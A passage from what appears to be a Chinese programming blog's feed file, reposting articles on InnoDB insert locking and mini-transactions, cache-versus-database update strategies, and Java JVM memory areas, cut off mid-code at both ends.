&amp;big_rec,</span><br><span class="line">40                n_ext, thr, &amp;mtr);</span><br><span class="line">41        }</span><br><span class="line">42    }</span><br><span class="line">43</span><br><span class="line">44    /* 提交 mini-transaction */</span><br><span class="line">45    mtr_commit(&amp;mtr);</span><br><span class="line">46}</span><br></pre></td></tr></tbody></table></figure><p>这里是执行 insert 语句的关键，可以发现执行插入操作的前后分别有一行代码：mtr_start() 和 mtr_commit()。这被称为 <strong>迷你事务（mini-transaction）</strong>，既然叫做事务，那这个函数的操作肯定是原子性的，事实上确实如此，insert 会在检查锁冲突和写数据之前，会对记录所在的页加一个 RW-X-LATCH 锁，执行完写数据之后再释放该锁（实际上写数据的操作就是写 redo log（重做日志），将脏页加入 flush list，这个后面有时间再深入分析了）。这个锁的释放非常快，但是这个锁足以保证在插入数据的过程中其他事务无法访问记录所在的页。mini-transaction 也可以包含子事务，实际上在 insert 的执行过程中就会加多个 mini-transaction。</p><p>每个 mini-transaction 会遵守下面的几个规则：</p><ul><li>修改一个页需要获得该页的 X-LATCH；</li><li>访问一个页需要获得该页的 S-LATCH 或 X-LATCH；</li><li>持有该页的 LATCH 直到修改或者访问该页的操作完成。</li></ul><p>所以，最后的最后，真相只有一个：insert 和 select … lock in share mode 不会发生幻读。整个流程如下：</p><ol><li>执行 insert 语句，对要操作的页加 RW-X-LATCH，然后判断是否有和插入意向锁冲突的锁，如果有，加插入意向锁，进入锁等待；如果没有，直接写数据，不加任何锁，结束后释放 RW-X-LATCH；</li><li>执行 select … lock in share mode 语句，对要操作的页加 RW-S-LATCH，如果页面上存在 RW-X-LATCH 会被阻塞，没有的话则判断记录上是否存在活跃的事务，如果存在，则为 insert 事务创建一个排他记录锁，并将自己加入到锁等待队列，最后也会释放 RW-S-LATCH；</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><ol><li>Locks Set by Different SQL Statements in InnoDB</li><li>Installing MySQL from Source</li><li>CMake 入门实战</li><li>MySQL源代码：从SQL语句到MySQL内部对象</li><li>MySQL · 源码分析 · 一条insert语句的执行过程</li><li>[MySQL源码] 一条简单insert语句的调用栈</li><li>MySQL5.7 : 对隐式锁转换的优化</li><li>[MySQL学习] Innodb锁系统(4) Insert/Delete 锁处理及死锁示例分析</li><li>InnoDB事务锁之行锁-insert加锁-隐式锁加锁原理</li><li>InnoDB事务锁之行锁-判断是否有隐式锁原理图</li><li>InnoDB事务锁之行锁-隐式锁转换显示锁举例理解原理</li><li>MySQL系列：innodb源码分析之mini transaction</li><li>MySQL - InnoDB mini transation</li><li>MySQL · 引擎特性 · InnoDB redo log漫游</li></ol><h1 id="原文：https-www-aneasystone-com-archives-2018-06-insert-locks-via-mysql"><a href="#原文：https-www-aneasystone-com-archives-2018-06-insert-locks-via-mysql" class="headerlink" title="原文：https://www.aneasystone.com/archives/2018/06/insert-locks-via-mysql-"></a>原文：<a href="https://www.aneasystone.com/archives/2018/06/insert-locks-via-mysql-">https://www.aneasystone.com/archives/2018/06/insert-locks-via-mysql-</a></h1><h1 id="source-code-html"><a href="#source-code-html" class="headerlink" title="source-code.html"></a>source-code.html</h1>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高并发场景下，到底先更新缓存还是先更新数据库？</title>
      <link href="/posts/3795959674/"/>
      <url>/posts/3795959674/</url>
      
        <content type="html"><![CDATA[<h1 id="高并发场景下，到底先更新缓存还是先更新数据库？"><a href="#高并发场景下，到底先更新缓存还是先更新数据库？" class="headerlink" title="高并发场景下，到底先更新缓存还是先更新数据库？"></a>高并发场景下，到底先更新缓存还是先更新数据库？</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在大型系统中，为了减少数据库压力通常会引入缓存机制，一旦引入缓存又很容易造成缓存和数据库数据不一致，导致用户看到的是旧数据。</p><p>为了减少数据不一致的情况，更新缓存和数据库的机制显得尤为重要，接下来带领大家踩踩坑。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510138.png" alt="Image"></p><h2 id="Cache-aside"><a href="#Cache-aside" class="headerlink" title="Cache aside"></a>Cache aside</h2><p><code>Cache aside</code>也就是<code>旁路缓存</code>，是比较常用的缓存策略。</p><p><strong>（1）<code>读请求</code>常见流程</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510215.png" alt="Image">Cache aside 读请求</p><p>应用首先会判断缓存是否有该数据，缓存命中直接返回数据，缓存未命中即缓存穿透到数据库，从数据库查询数据然后回写到缓存中，最后返回数据给客户端。</p><p><strong>（2）<code>写请求</code>常见流程</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510222.png" alt="Image">Cache aside 写请求</p><p>首先更新数据库，然后从缓存中删除该数据。</p><p>看了写请求的图之后，有些同学可能要问了：为什么要删除缓存，直接更新不就行了？这里涉及到几个坑，我们一步一步踩下去。</p><h2 id="Cache-aside踩坑"><a href="#Cache-aside踩坑" class="headerlink" title="Cache aside踩坑"></a>Cache aside踩坑</h2><p>Cache aside策略如果用错就会遇到深坑，下面我们来逐个踩。</p><p><strong>踩坑一：先更新数据库，再更新缓存</strong></p><p>如果同时有两个<code>写请求</code>需要更新数据，每个写请求都先更新数据库再更新缓存，在并发场景可能会出现数据不一致的情况。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510240.png" alt="Image">先更新数据库，再更新缓存</p><p>如上图的执行过程：</p><p>（1）<code>写请求1</code>更新数据库，将 age 字段更新为18；</p><p>（2）<code>写请求2</code>更新数据库，将 age 字段更新为20；</p><p>（3）<code>写请求2</code>更新缓存，缓存 age 设置为20；</p><p>（4）<code>写请求1</code>更新缓存，缓存 age 设置为18；</p><p>执行完预期结果是数据库 age 为20，缓存 age 为20，结果缓存 age为18，这就造成了缓存数据不是最新的，出现了脏数据。</p><p><strong>踩坑二：先删缓存，再更新数据库</strong></p><p>如果<code>写请求</code>的处理流程是<code>先删缓存再更新数据库</code>，在一个<code>读请求</code>和一个<code>写请求</code>并发场景下可能会出现数据不一致情况。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510246.png" alt="Image">先删缓存，再更新数据库</p><p>如上图的执行过程：</p><p>（1）<code>写请求</code>删除缓存数据；</p><p>（2）<code>读请求</code>查询缓存未击中(Hit Miss)，紧接着查询数据库，将返回的数据回写到缓存中；</p><p>（3）<code>写请求</code>更新数据库。</p><p>整个流程下来发现<code>数据库</code>中age为20，<code>缓存</code>中age为18，缓存和数据库数据不一致，缓存出现了脏数据。</p><p><strong>踩坑三：先更新数据库，再删除缓存</strong></p><p>在实际的系统中针对<code>写请求</code>还是推荐<code>先更新数据库再删除缓存</code>，但是在理论上还是存在问题，以下面这个例子说明。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510246-2891910.png" alt="Image">先更新数据库，再删除缓存</p><p>如上图的执行过程：</p><p>（1）<code>读请求</code>先查询缓存，缓存未击中，查询数据库返回数据；</p><p>（2）<code>写请求</code>更新数据库，删除缓存；</p><p>（3）<code>读请求</code>回写缓存；</p><p>整个流程操作下来发现<code>数据库age为20</code>，<code>缓存age为18</code>，即数据库与缓存不一致，导致应用程序从缓存中读到的数据都为旧数据。</p><p>但我们仔细想一下，上述问题发生的概率其实非常低，因为通常数据库更新操作比内存操作耗时多出几个数量级，上图中最后一步回写缓存（set age 18）速度非常快，通常会在更新数据库之前完成。</p><p>如果这种极端场景出现了怎么办？我们得想一个兜底的办法：<code>缓存数据设置过期时间</code>。通常在系统中是可以允许少量的数据短时间不一致的场景出现。</p><h2 id="Read-through"><a href="#Read-through" class="headerlink" title="Read through"></a>Read through</h2><p>在 Cache Aside 更新模式中，应用代码需要维护两个数据源头：一个是缓存，一个是数据库。而在 <code>Read-Through</code> 策略下，应用程序无需管理缓存和数据库，只需要将数据库的同步委托给缓存提供程序 <code>Cache Provider</code> 即可。所有数据交互都是通过<code>抽象缓存层</code>完成的。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510187.png" alt="Image">Read-Through流程</p><p>如上图，应用程序只需要与<code>Cache Provider</code>交互，不用关心是从缓存取还是数据库。</p><p>在进行大量读取时，<code>Read-Through</code> 可以减少数据源上的负载，也对缓存服务的故障具备一定的弹性。如果缓存服务挂了，则缓存提供程序仍然可以通过直接转到数据源来进行操作。</p><p><code>Read-Through 适用于多次请求相同数据的场景</code>，这与 Cache-Aside 策略非常相似，但是二者还是存在一些差别，这里再次强调一下：</p><ul><li>在 Cache-Aside 中，应用程序负责从数据源中获取数据并更新到缓存。</li><li>在 Read-Through 中，此逻辑通常是由独立的缓存提供程序（Cache Provider）支持。</li></ul><h2 id="Write-through"><a href="#Write-through" class="headerlink" title="Write through"></a>Write through</h2><p><code>Write-Through</code> 策略下，当发生数据更新(Write)时，缓存提供程序 <code>Cache Provider</code> 负责更新底层数据源和缓存。</p><p>缓存与数据源保持一致，并且写入时始终通过<code>抽象缓存层</code>到达数据源。</p><p><code>Cache Provider</code>类似一个代理的作用。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230825000426632.png" alt="Image">Write-Through流程</p><h2 id="Write-behind"><a href="#Write-behind" class="headerlink" title="Write behind"></a>Write behind</h2><p><code>Write behind</code>在一些地方也被成为<code>Write back</code>， 简单理解就是：应用程序更新数据时只更新缓存， <code>Cache Provider</code>每隔一段时间将数据刷新到数据库中。说白了就是<code>延迟写入</code>。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3795959674/640-20230824234510270.png" alt="Image">Write behind流程</p><p>如上图，应用程序更新两个数据，Cache Provider 会立即写入缓存中，但是隔一段时间才会批量写入数据库中。</p><p>这种方式有优点也有缺点：</p><ul><li><code>优点</code>是数据写入速度非常快，适用于频繁写的场景。</li><li><code>缺点</code>是缓存和数据库不是强一致性，对一致性要求高的系统慎用。</li></ul><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>学了这么多，相信大家对缓存更新的策略都已经有了清晰的认识。最后稍稍总结一下。</p><p>缓存更新的策略主要分为三种：</p><ul><li>Cache aside</li><li>Read/Write through</li><li>Write behind</li></ul><p>Cache aside 通常会先更新数据库，然后再删除缓存，为了兜底通常还会将数据设置缓存时间。</p><p>Read/Write through 一般是由一个 Cache Provider 对外提供读写操作，应用程序不用感知操作的是缓存还是数据库。</p><p>Write behind简单理解就是延迟写入，Cache Provider 每隔一段时间会批量输入数据库，优点是应用程序写入速度非常快。</p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存区域详解</title>
      <link href="/posts/576968662/"/>
      <url>/posts/576968662/</url>
      
        <content type="html"><![CDATA[<blockquote><p>如果没有特殊说明，都是针对的是 HotSpot 虚拟机。</p><p>本文基于《深入理解 Java 虚拟机：JVM 高级特性与最佳实践》进行总结补充。</p><p>常见面试题：</p><ul><li>介绍下 Java 内存区域（运行时数据区）</li><li>Java 对象的创建过程（五步，建议能默写出来并且要知道每一步虚拟机做了什么）</li><li>对象的访问定位的两种方式（句柄和直接指针两种方式）</li></ul></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于 Java 程序员来说，在虚拟机自动内存管理机制下，不再需要像 C/C++程序开发程序员这样为每一个 new 操作去写对应的 delete/free 操作，不容易出现内存泄漏和内存溢出问题。正是因为 Java 程序员把内存控制权利交给 Java 虚拟机，一旦出现内存泄漏和溢出方面的问题，如果不了解虚拟机是怎样使用内存的，那么排查错误将会是一个非常艰巨的任务。</p><h2 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h2><p>Java 虚拟机在执行 Java 程序的过程中会把它管理的内存划分成若干个不同的数据区域。</p><p>JDK 1.8 和之前的版本略有不同，我们这里以 JDK 1.7 和 JDK 1.8 这两个版本为例介绍。</p><p><strong>JDK 1.7</strong>：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/java-runtime-data-areas-jdk1.7.png" alt="Java 运行时数据区域（JDK1.7）"></p><p><strong>JDK 1.8</strong>：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/java-runtime-data-areas-jdk1.8.png" alt="Java 运行时数据区域（JDK1.8 ）"></p><p><strong>线程私有的：</strong></p><ul><li>程序计数器</li><li>虚拟机栈</li><li>本地方法栈</li></ul><p><strong>线程共享的：</strong></p><ul><li>堆</li><li>方法区</li><li>直接内存 (非运行时数据区的一部分)</li></ul><p>Java 虚拟机规范对于运行时数据区域的规定是相当宽松的。以堆为例：堆可以是连续空间，也可以不连续。堆的大小可以固定，也可以在运行时按需扩展 。虚拟机实现者可以使用任何垃圾回收算法管理堆，甚至完全不进行垃圾收集也是可以的。</p><h3 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h3><p>程序计数器是一块较小的内存空间，可以看作是当前线程所执行的字节码的行号指示器。字节码解释器工作时通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等功能都需要依赖这个计数器来完成。</p><p>另外，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各线程之间计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。</p><p>从上面的介绍中我们知道了程序计数器主要有两个作用：</p><ul><li>字节码解释器通过改变程序计数器来依次读取指令，从而实现代码的流程控制，如：顺序执行、选择、循环、异常处理。</li><li>在多线程的情况下，程序计数器用于记录当前线程执行的位置，从而当线程被切换回来的时候能够知道该线程上次运行到哪儿了。</li></ul><p>⚠️ 注意：程序计数器是唯一一个不会出现 <code>OutOfMemoryError</code> 的内存区域，它的生命周期随着线程的创建而创建，随着线程的结束而死亡。</p><h3 id="Java-虚拟机栈"><a href="#Java-虚拟机栈" class="headerlink" title="Java 虚拟机栈"></a>Java 虚拟机栈</h3><p>与程序计数器一样，Java 虚拟机栈（后文简称栈）也是线程私有的，它的生命周期和线程相同，随着线程的创建而创建，随着线程的死亡而死亡。</p><p>栈绝对算的上是 JVM 运行时数据区域的一个核心，除了一些 Native 方法调用是通过本地方法栈实现的(后面会提到)，其他所有的 Java 方法调用都是通过栈来实现的（也需要和其他运行时数据区域比如程序计数器配合）。</p><p>方法调用的数据需要通过栈进行传递，每一次方法调用都会有一个对应的栈帧被压入栈中，每一个方法调用结束后，都会有一个栈帧被弹出。</p><p>栈由一个个栈帧组成，而每个栈帧中都拥有：局部变量表、操作数栈、动态链接、方法返回地址。和数据结构上的栈类似，两者都是先进后出的数据结构，只支持出栈和入栈两种操作。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/stack-area.png" alt="Java 虚拟机栈"></p><p><strong>局部变量表</strong> 主要存放了编译期可知的各种数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置）。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/local-variables-table.png" alt="局部变量表"></p><p><strong>操作数栈</strong> 主要作为方法调用的中转站使用，用于存放方法执行过程中产生的中间计算结果。另外，计算过程中产生的临时变量也会放在操作数栈中。</p><p><strong>动态链接</strong> 主要服务一个方法需要调用其他方法的场景。Class 文件的常量池里保存有大量的符号引用比如方法引用的符号引用。当一个方法要调用其他方法，需要将常量池中指向方法的符号引用转化为其在内存地址中的直接引用。动态链接的作用就是为了将符号引用转换为调用方法的直接引用，这个过程也被称为 <strong>动态连接</strong> 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/jvmimage-20220331175738692.png"></p><p>栈空间虽然不是无限的，但一般正常调用的情况下是不会出现问题的。不过，如果函数调用陷入无限循环的话，就会导致栈中被压入太多栈帧而占用太多空间，导致栈空间过深。那么当线程请求栈的深度超过当前 Java 虚拟机栈的最大深度的时候，就抛出 <code>StackOverFlowError</code> 错误。</p><p>Java 方法有两种返回方式，一种是 return 语句正常返回，一种是抛出异常。不管哪种返回方式，都会导致栈帧被弹出。也就是说， <strong>栈帧随着方法调用而创建，随着方法结束而销毁。无论方法正常完成还是异常完成都算作方法结束。</strong></p><p>除了 <code>StackOverFlowError</code> 错误之外，栈还可能会出现<code>OutOfMemoryError</code>错误，这是因为如果栈的内存大小可以动态扩展， 如果虚拟机在动态扩展栈时无法申请到足够的内存空间，则抛出<code>OutOfMemoryError</code>异常。</p><p>简单总结一下程序运行中栈可能会出现两种错误：</p><ul><li><strong><code>StackOverFlowError</code>：</strong> 若栈的内存大小不允许动态扩展，那么当线程请求栈的深度超过当前 Java 虚拟机栈的最大深度的时候，就抛出 <code>StackOverFlowError</code> 错误。</li><li><strong><code>OutOfMemoryError</code>：</strong> 如果栈的内存大小可以动态扩展， 如果虚拟机在动态扩展栈时无法申请到足够的内存空间，则抛出<code>OutOfMemoryError</code>异常。</li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%8B%E7%AC%AC%E4%B8%89%E7%89%88%E7%9A%84%E7%AC%AC2%E7%AB%A0-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88.png"></p><h3 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h3><p>和虚拟机栈所发挥的作用非常相似，区别是：<strong>虚拟机栈为虚拟机执行 Java 方法 （也就是字节码）服务，而本地方法栈则为虚拟机使用到的 Native 方法服务。</strong> 在 HotSpot 虚拟机中和 Java 虚拟机栈合二为一。</p><p>本地方法被执行的时候，在本地方法栈也会创建一个栈帧，用于存放该本地方法的局部变量表、操作数栈、动态链接、出口信息。</p><p>方法执行完毕后相应的栈帧也会出栈并释放内存空间，也会出现 <code>StackOverFlowError</code> 和 <code>OutOfMemoryError</code> 两种错误。</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>Java 虚拟机所管理的内存中最大的一块，Java 堆是所有线程共享的一块内存区域，在虚拟机启动时创建。<strong>此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。</strong></p><p>Java 世界中“几乎”所有的对象都在堆中分配，但是，随着 JIT 编译器的发展与逃逸分析技术逐渐成熟，栈上分配、标量替换优化技术将会导致一些微妙的变化，所有的对象都分配到堆上也渐渐变得不那么“绝对”了。从 JDK 1.7 开始已经默认开启逃逸分析，如果某些方法中的对象引用没有被返回或者未被外面使用（也就是未逃逸出去），那么对象可以直接在栈上分配内存。</p><p>Java 堆是垃圾收集器管理的主要区域，因此也被称作 <strong>GC 堆（Garbage Collected Heap）</strong>。从垃圾回收的角度，由于现在收集器基本都采用分代垃圾收集算法，所以 Java 堆还可以细分为：新生代和老年代；再细致一点有：Eden、Survivor、Old 等空间。进一步划分的目的是更好地回收内存，或者更快地分配内存。</p><p>在 JDK 7 版本及 JDK 7 版本之前，堆内存被通常分为下面三部分：</p><ol><li>新生代内存(Young Generation)</li><li>老生代(Old Generation)</li><li>永久代(Permanent Generation)</li></ol><p>下图所示的 Eden 区、两个 Survivor 区 S0 和 S1 都属于新生代，中间一层属于老年代，最下面一层属于永久代。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/hotspot-heap-structure.png" alt="堆内存结构"></p><p><strong>JDK 8 版本之后 PermGen(永久代) 已被 Metaspace(元空间) 取代，元空间使用的是本地内存。</strong> （我会在方法区这部分内容详细介绍到）。</p><p>大部分情况，对象都会首先在 Eden 区域分配，在一次新生代垃圾回收后，如果对象还存活，则会进入 S0 或者 S1，并且对象的年龄还会加 1(Eden 区-&gt;Survivor 区后对象的初始年龄变为 1)，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 <code>-XX:MaxTenuringThreshold</code> 来设置。</p><blockquote><p><strong>🐛 修正（参见：<a href="https://github.com/Snailclimb/JavaGuide/issues/552">issue552</a>）</strong>：“Hotspot 遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了 survivor 区的一半时，取这个年龄和 MaxTenuringThreshold 中更小的一个值，作为新的晋升年龄阈值”。</p><p><strong>动态年龄计算的代码如下</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint <span class="title">ageTable::compute_tenuring_threshold</span><span class="params">(<span class="type">size_t</span> survivor_capacity)</span> </span>{</span><br><span class="line"><span class="comment">//survivor_capacity是survivor空间的大小</span></span><br><span class="line"><span class="type">size_t</span> desired_survivor_size = (<span class="type">size_t</span>)((((<span class="type">double</span>) survivor_capacity)*TargetSurvivorRatio)/<span class="number">100</span>);</span><br><span class="line"><span class="type">size_t</span> total = <span class="number">0</span>;</span><br><span class="line">uint age = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (age &lt; table_size) {</span><br><span class="line">total += sizes[age];<span class="comment">//sizes数组是每个年龄段对象大小</span></span><br><span class="line"><span class="keyword">if</span> (total &gt; desired_survivor_size) <span class="keyword">break</span>;</span><br><span class="line">age++;</span><br><span class="line">}</span><br><span class="line">uint result = age &lt; MaxTenuringThreshold ? age : MaxTenuringThreshold;</span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></blockquote><p>堆这里最容易出现的就是 <code>OutOfMemoryError</code> 错误，并且出现这种错误之后的表现形式还会有几种，比如：</p><ol><li>**<code>java.lang.OutOfMemoryError: GC Overhead Limit Exceeded</code>**：当 JVM 花太多时间执行垃圾回收并且只能回收很少的堆空间时，就会发生此错误。</li><li><strong><code>java.lang.OutOfMemoryError: Java heap space</code></strong> :假如在创建新的对象时, 堆内存中的空间不足以存放新创建的对象, 就会引发此错误。(和配置的最大堆内存有关，且受制于物理内存大小。最大堆内存可通过<code>-Xmx</code>参数配置，若没有特别配置，将会使用默认值，详见：<a href="https://stackoverflow.com/questions/28272923/default-xmxsize-in-java-8-max-heap-size">Default Java 8 max heap size</a>)</li><li>……</li></ol><h3 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h3><p>方法区属于是 JVM 运行时数据区域的一块逻辑区域，是各个线程共享的内存区域。</p><p>《Java 虚拟机规范》只是规定了有方法区这么个概念和它的作用，方法区到底要如何实现那就是虚拟机自己要考虑的事情了。也就是说，在不同的虚拟机实现上，方法区的实现是不同的。</p><p>当虚拟机要使用一个类时，它需要读取并解析 Class 文件获取相关信息，再将信息存入到方法区。方法区会存储已被虚拟机加载的 <strong>类信息、字段信息、方法信息、常量、静态变量、即时编译器编译后的代码缓存等数据</strong>。</p><p><strong>方法区和永久代以及元空间是什么关系呢？</strong> 方法区和永久代以及元空间的关系很像 Java 中接口和类的关系，类实现了接口，这里的类就可以看作是永久代和元空间，接口可以看作是方法区，也就是说永久代以及元空间是 HotSpot 虚拟机对虚拟机规范中方法区的两种实现方式。并且，永久代是 JDK 1.8 之前的方法区实现，JDK 1.8 及以后方法区的实现变成了元空间。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/method-area-implementation.png" alt="HotSpot 虚拟机方法区的两种实现"></p><p><strong>为什么要将永久代 (PermGen) 替换为元空间 (MetaSpace) 呢?</strong></p><p>下图来自《深入理解 Java 虚拟机》第 3 版 2.2.5</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/20210425134508117.png"></p><p>1、整个永久代有一个 JVM 本身设置的固定大小上限，无法进行调整，而元空间使用的是本地内存，受本机可用内存的限制，虽然元空间仍旧可能溢出，但是比原来出现的几率会更小。</p><blockquote><p>当元空间溢出时会得到如下错误：<code>java.lang.OutOfMemoryError: MetaSpace</code></p></blockquote><p>你可以使用 <code>-XX：MaxMetaspaceSize</code> 标志设置最大元空间大小，默认值为 unlimited，这意味着它只受系统内存的限制。<code>-XX：MetaspaceSize</code> 调整标志定义元空间的初始大小如果未指定此标志，则 Metaspace 将根据运行时的应用程序需求动态地重新调整大小。</p><p>2、元空间里面存放的是类的元数据，这样加载多少类的元数据就不由 <code>MaxPermSize</code> 控制了, 而由系统的实际可用空间来控制，这样能加载的类就更多了。</p><p>3、在 JDK8，合并 HotSpot 和 JRockit 的代码时, JRockit 从来没有一个叫永久代的东西, 合并之后就没有必要额外的设置这么一个永久代的地方了。</p><p><strong>方法区常用参数有哪些？</strong></p><p>JDK 1.8 之前永久代还没被彻底移除的时候通常通过下面这些参数来调节方法区大小。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:PermSize=N <span class="comment">//方法区 (永久代) 初始大小</span></span><br><span class="line">-XX:MaxPermSize=N <span class="comment">//方法区 (永久代) 最大大小,超过这个值将会抛出 OutOfMemoryError 异常:java.lang.OutOfMemoryError: PermGen</span></span><br></pre></td></tr></tbody></table></figure><p>相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入方法区后就“永久存在”了。</p><p>JDK 1.8 的时候，方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是本地内存。下面是一些常用参数：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:MetaspaceSize=N <span class="comment">//设置 Metaspace 的初始（和最小大小）</span></span><br><span class="line">-XX:MaxMetaspaceSize=N <span class="comment">//设置 Metaspace 的最大大小</span></span><br></pre></td></tr></tbody></table></figure><p>与永久代很大的不同就是，如果不指定大小的话，随着更多类的创建，虚拟机会耗尽所有可用的系统内存。</p><h3 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h3><p>Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有用于存放编译期生成的各种字面量（Literal）和符号引用（Symbolic Reference）的 <strong>常量池表(Constant Pool Table)</strong> 。</p><p>字面量是源代码中的固定值的表示法，即通过字面我们就能知道其值的含义。字面量包括整数、浮点数和字符串字面量。常见的符号引用包括类符号引用、字段符号引用、方法符号引用、接口方法符号。</p><p>《深入理解 Java 虚拟机》7.34 节第三版对符号引用和直接引用的解释如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/symbol-reference-and-direct-reference.png" alt="符号引用和直接引用"></p><p>常量池表会在类加载后存放到方法区的运行时常量池中。</p><p>运行时常量池的功能类似于传统编程语言的符号表，尽管它包含了比典型符号表更广泛的数据。</p><p>既然运行时常量池是方法区的一部分，自然受到方法区内存的限制，当常量池无法再申请到内存时会抛出 <code>OutOfMemoryError</code> 错误。</p><h3 id="字符串常量池"><a href="#字符串常量池" class="headerlink" title="字符串常量池"></a>字符串常量池</h3><p><strong>字符串常量池</strong> 是 JVM 为了提升性能和减少内存消耗针对字符串（String 类）专门开辟的一块区域，主要目的是为了避免字符串的重复创建。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 